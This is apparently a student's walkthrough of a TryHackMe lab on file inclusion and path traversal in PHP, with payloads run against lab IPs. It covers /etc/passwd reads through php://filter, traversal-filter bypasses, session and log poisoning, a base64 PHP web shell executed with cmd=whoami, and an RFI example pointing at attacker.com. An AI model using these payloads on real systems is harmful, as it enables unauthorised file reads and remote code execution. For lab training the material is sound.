# File Inclusion, Path Traversal

**Room Link:** [https://tryhackme.com/r/room/filepathtraversal](https://tryhackme.com/r/room/filepathtraversal)



## File Inclusion Types

### **Basics of File Inclusion**

A traversal string, commonly seen as `../`, is used in path traversal attacks to navigate through the directory structure of a file system. It's essentially a way to move up one directory level. Traversal strings are used to access files outside the intended directory.

Relative pathing refers to locating files based on the current directory. For example, `include('./folder/file.php')` implies that `file.php` is located inside a folder named `folder`, which is in the same directory as the executing script.

Absolute pathing involves specifying the complete path starting from the root directory. For example, `/var/www/html/folder/file.php` is an absolute path.

### **Remote File Inclusion**

Remote File Inclusion, or RFI, is a vulnerability that allows attackers to include remote files, often through input manipulation. This can lead to the execution of malicious scripts or code on the server.



Typically, RFI occurs in applications that dynamically include external files or scripts. Attackers can manipulate parameters in a request to point to external malicious files. For example, if a web application uses a URL in a GET parameter like `include.php?page=http://attacker.com/exploit.php`, an attacker can replace the URL with a path to a malicious script.



### **Local File Inclusion**

Local File Inclusion, or LFI, typically occurs when an attacker exploits vulnerable input fields to access or execute files on the server. Attackers usually exploit poorly sanitized input fields to manipulate file paths, aiming to access files outside the intended directory. For example, using a traversal string, an attacker might access sensitive files like `include.php?page=../../../../etc/passwd`.



While LFI primarily leads to unauthorized file access, it can escalate to RCE. This can occur if the attacker can upload or inject executable code into a file that is later included or executed by the server. Techniques such as log poisoning, which means injecting code into log files and then including those log files, are examples of how LFI can lead to RCE.



### **RFI vs LFI Exploitation Process**

\


<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/51fca7adb2f8deb2d2bd3a83dc4d0c00.png" alt=""><figcaption></figcaption></figure>

This diagram above differentiates the process of exploiting RFI and LFI vulnerabilities. In RFI, the focus is on including and executing a remote file, whereas, in LFI, the attacker aims to access local files and potentially leverage this access to execute code on the server.





## **PHP Wrappers**

PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in PHP protocols, which may lead to significant security risks if not properly handled.

For instance, an application vulnerable to LFI might include files based on a user-supplied input without sufficient validation. In such cases, attackers can use the `php://filter` filter. This filter allows a user to perform basic modification operations on the data before it's read or written. For example, if an attacker wants to encode the contents of an included file like `/etc/passwd` in base64. This can be achieved by using the `convert.base64-encode` conversion filter of the wrapper. The final payload will then be `php://filter/convert.base64-encode/resource=/etc/passwd`

For example, go to [http://10.10.198.29/playground.php](http://10.10.198.29/playground.php) and use the final payload above.

![Vulnerable application containing the payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f7ffaa4b76733a80bbf34544770de6e5.png)\


Once the application processes this payload, the server will return an encoded content of the passwd file.

![Vulnerable application returns the encoded value of the requested file](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/099db41dc5da2eb30e7898b3ee0fe979.png)

Which the attacker can then decode to reveal the contents of the target file.\


![Decoded value of the /etc/passwd file](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/30d1aaab9aa2add722fe811e674b1145.png)\


There are many categories of filters in PHP. Some of these are String Filters (string.rot13, string.toupper, string.tolower, and string.strip\_tags), Conversion Filters (convert.base64-encode, convert.base64-decode, convert.quoted-printable-encode, and convert.quoted-printable-decode), Compression Filters (zlib.deflate and zlib.inflate), and Encryption Filters (mcrypt, and mdecrypt) which is now deprecated.

For example, the table below represents the output of the target file .htaccess using the different string filters in PHP.

| Payload                                                          | Output                                                  |
| ---------------------------------------------------------------- | ------------------------------------------------------- |
| <p>php://filter/convert.base64-encode/resource=.htaccess<br></p> | <p>UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz<br></p> |
| <p>php://filter/string.rot13/resource=.htaccess<br></p>          | <p>ErjevgrRatvar ba Bcgvbaf -Vaqrkrf<br></p>            |
| <p>php://filter/string.toupper/resource=.htaccess<br></p>        | <p>REWRITEENGINE ON OPTIONS -INDEXES<br></p>            |
| <p>php://filter/string.tolower/resource=.htaccess<br></p>        | <p>rewriteengine on options -indexes<br></p>            |
| <p>php://filter/string.strip_tags/resource=.htaccess<br></p>     | RewriteEngine on Options -Indexes                       |
| No filter applied                                                | RewriteEngine on Options -Indexes                       |

## **Data Wrapper**

The data stream wrapper is another example of PHP's wrapper functionality. The `data://` wrapper allows inline data embedding. It is used to embed small amounts of data directly into the application code.

For example, go to [http://10.10.198.29/playground.php](http://10.10.198.29/playground.php) and use the payload `data:text/plain,<?php%20phpinfo();%20?>`. In the below image, this URL could cause PHP code execution, displaying the PHP configuration details.

![Vulnerable application containing the data payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/da7537e2743e4302afc60c1982384e3a.png)

The breakdown of the payload `data:text/plain,<?php phpinfo(); ?>` is:

* `data:` as the URL.
* `mime-type` is set as `text/plain`.
* The data part includes a PHP code snippet: `<?php phpinfo(); ?>`.



### **Base Directory Breakout**

In web applications, safeguards are put in place to prevent path traversal attacks. However, these defences are not always foolproof. Below is the code of an application that insists that the filename provided by the user must begin with a predetermined base directory and will also strip out file traversal strings to protect the application from file traversal attacks:

Sample Code

```php
function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}

if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    }else{ 
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}
```

It's possible to comply with this requirement and navigate to other directories. This can be achieved by appending the necessary directory traversal sequences after the mandatory base folder.

For example, go to [http://10.10.198.29/lfi.php](http://machine\_ip/lfi.php) and use the payload `/var/www/html/..//..//..//etc/passwd`.

The PHP function `containsStr` checks if a substring exists within a string. The if condition checks two things. First, if `$_GET['page']` does not contain the substring `../..`, and if `$_GET['page']` contains the substring `/var/www/html`, however, `..//..//` bypasses this filter because it still effectively navigates up two directories, similar to `../../`. It does not exactly match the blocked pattern `../..` due to the extra slashes. The extra slashes `//` in `..//..//` are treated as a single slash by the file system. This means `../../` and `..//..//` are functionally equivalent in terms of directory navigation but only `../../` is explicitly filtered out by the code.

![Vulnerable application containing the ..//..// payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/5465732ced81f3183c2b1443e4ea8503.png)

### **Obfuscation**

Obfuscation techniques are often used to bypass basic security filters that web applications might have in place. These filters typically look for obvious directory traversal sequences like `../`. However, attackers can often evade detection by obfuscating these sequences and still navigate through the server's filesystem.

Encoding transforms characters into a different format. In LFI, attackers commonly use URL encoding (percent-encoding), where characters are represented using percentage symbols followed by hexadecimal values. For instance, `../` can be encoded or obfuscated in several ways to bypass simple filters.

* Standard URL Encoding: `../` becomes `%2e%2e%2f`
* Double Encoding: Useful if the application decodes inputs twice. `../` becomes `%252e%252e%252f`
* Obfuscation: Attackers can use payloads like `....//`, which help in avoiding detection by simple string matching or filtering mechanisms. This obfuscation technique is intended to conceal directory traversal attempts, making them less apparent to basic security filters.

For example, imagine an application that mitigates LFI by filtering out `../`:

Sample Script

```php
$file = $_GET['file'];
$file = str_replace('../', '', $file);

include('files/' . $file);
```

An attacker can potentially bypass this filter using the following methods:

1. **URL Encoded Bypass:** The attacker can use the URL-encoded version of the payload like `?file=%2e%2e%2fconfig.php`. The server decodes this input to `../config.php`, bypassing the filter.
2. **Double Encoded Bypass:** The attacker can use double encoding if the application decodes inputs twice. The payload would then be `?file=%252e%252e%252fconfig.php`, where a dot is `%252e`, and a slash is `%252f`. The first decoding step changes `%252e%252e%252f` to `%2e%2e%2f`. The second decoding step then translates it to `../config.php`.
3. **Obfuscation:** An attacker could use the payload `....//config.php`, which, after the application strips out the apparent traversal string, would effectively become `../config.php`.



## LFI2RCE - Session Files

### **PHP Session Files**

PHP session files can also be used in an LFI attack, leading to Remote Code Execution, particularly if an attacker can manipulate the session data. In a typical web application, session data is stored in files on the server. If an attacker can inject malicious code into these session files, and if the application includes these files through an LFI vulnerability, this can lead to code execution.

For example, the vulnerable application hosted in [http://10.10.198.29/sessions.php](http://10.10.198.29/sessions.php) contains the below code:

Sample Code

```php
if(isset($_GET['page'])){
    $_SESSION['page'] = $_GET['page'];
    echo "You're currently in" . $_GET["page"];
    include($_GET['page']);
}
```

An attacker could exploit this vulnerability by injecting a PHP code into their session variable by using `<?php echo phpinfo(); ?>` in the page parameter.

\


<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/110472d2d2ae7b090b8242b3b1a3818e.png" alt=""><figcaption></figcaption></figure>

This code is then saved in the session file on the server. Subsequently, the attacker can use the LFI vulnerability to include this session file. Since session IDs are hashed, the ID can be found in the cookies section of your browser.

\


<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/82474b4664ba1fd739c339861320174b.png" alt=""><figcaption></figcaption></figure>

Accessing the URL `sessions.php?page=/var/lib/php/sessions/sess_[sessionID]` will execute the injected PHP code in the session file. Note that you have to replace \[sessionID] with the value from your PHPSESSID cookie.

![Injected php code in the session file has been executed](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/d335c5261b4cfa981521ffeb098a796c.png)



## LFI2RCE - Log Poisoning

### **Log Poisoning**

Log poisoning is a technique where an attacker injects executable code into a web server's log file and then uses an LFI vulnerability to include and execute this log file. This method is particularly stealthy because log files are shared and are a seemingly harmless part of web server operations. In a log poisoning attack, the attacker must first inject malicious PHP code into a log file. This can be done in various ways, such as crafting an evil user agent, sending a payload via URL using Netcat, or a referrer header that the server logs. Once the PHP code is in the log file, the attacker can exploit an LFI vulnerability to include it as a standard PHP file. This causes the server to execute the malicious code contained in the log file, leading to RCE.

For example, if an attacker sends a Netcat request to the vulnerable machine containing a PHP code:

Sample Request

```php
$ nc 10.10.198.29 80      
<?php echo phpinfo(); ?>
HTTP/1.1 400 Bad Request
Date: Thu, 23 Nov 2023 05:39:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 335
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.198.29.eu-west-1.compute.internal Port 80</address>
</body></html>
```

The code will then be logged in the server's access logs.

![Apache access log containing the injected PHP code](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/d9c19f6c916c790bb4fa94e09a5fcaef.png)\


The attacker then uses LFI to include the access log file: `?page=/var/log/apache2/access.log`

![Injected PHP code in the web access log has been executed](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f4a675e26aac4f257dfd24942bcdbd0f.png)



## LFI2RCE - Wrappers

### **PHP Wrappers**

PHP wrappers can also be used not only for reading files but also for code execution. The key here is the `php://filter` stream wrapper, which enables file transformations on the fly. Take the PHP base64 filter as an example. This method allows attackers to execute arbitrary code on the server using a base64-encoded payload.&#x20;



We will use the PHP code `<?php system($_GET['cmd']); echo 'Shell done!'; ?>` as our payload. The value of the payload, when encoded to base64, will be `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`

| Position | Field                       | Value                                                                           |
| -------- | --------------------------- | ------------------------------------------------------------------------------- |
| 1        | <p>Protocol Wrapper<br></p> | php://filter                                                                    |
| 2        | Filter                      | <p>convert.base64-decode<br></p>                                                |
| 3        | <p>Resource Type<br></p>    | <p>resource=<br></p>                                                            |
| 4        | <p>Data Type<br></p>        | <p>data://plain/text,<br></p>                                                   |
| 5        | <p>Encoded Payload<br></p>  | <p>PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+<br></p> |

In the table above, `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+` is the base64-encoded version of the PHP code. When the server processes this request, it first decodes the base64 string and then executes the PHP code, allowing the attacker to run commands on the server via the "cmd" GET parameter.\


![Vulnerable application containing the PHP wrapper payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/0e01212213a4a512d552b55d22b7014d.png)

The above did not work from the web browser because of how it encodes, but from burp it worked

```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7IGVjaG8gJ1NoZWxsIGRvbmUhJzsgPz4=&cmd=whoami
```

<figure><img src="../../.gitbook/assets/image (1081).png" alt=""><figcaption></figcaption></figure>



Note: It is important to not include the \&cmd=whoami in the input field since it will be encoded when the form is submitted. Once encoded, the backend will treat it as part of the base64 code, giving you an invalid byte sequence error.

```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7IGVjaG8gJ1NoZWxsIGRvbmUhJzsgPz4=
```

<figure><img src="../../.gitbook/assets/image (1082).png" alt=""><figcaption></figcaption></figure>

aaa









































































